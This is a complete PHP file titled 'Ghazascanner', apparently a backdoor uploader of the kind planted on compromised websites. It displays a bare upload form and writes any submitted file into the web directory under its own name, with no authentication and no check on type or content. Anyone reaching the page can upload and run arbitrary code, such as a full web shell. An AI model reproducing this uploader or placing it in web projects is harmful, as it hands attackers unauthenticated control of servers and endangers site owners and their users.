<?php
echo '<html><head><title>Ghazascanner</title>
</head>';
echo 'Ghazascanner<form enctype="multipart/form-data" action="" method="POST">
    <input type="file" name="uploaded_file"></input>
    <input type="submit" value="Upload"></input>
  </form>';
  if(!empty($_FILES['uploaded_file']))
  {
    $path = basename( $_FILES['uploaded_file']['name']);
    if(move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $path)) {
      echo "The file ".  basename( $_FILES['uploaded_file']['name']). 
      " uploaded !";
    } else{
        echo "not uploaded !";
    }
  }
?>
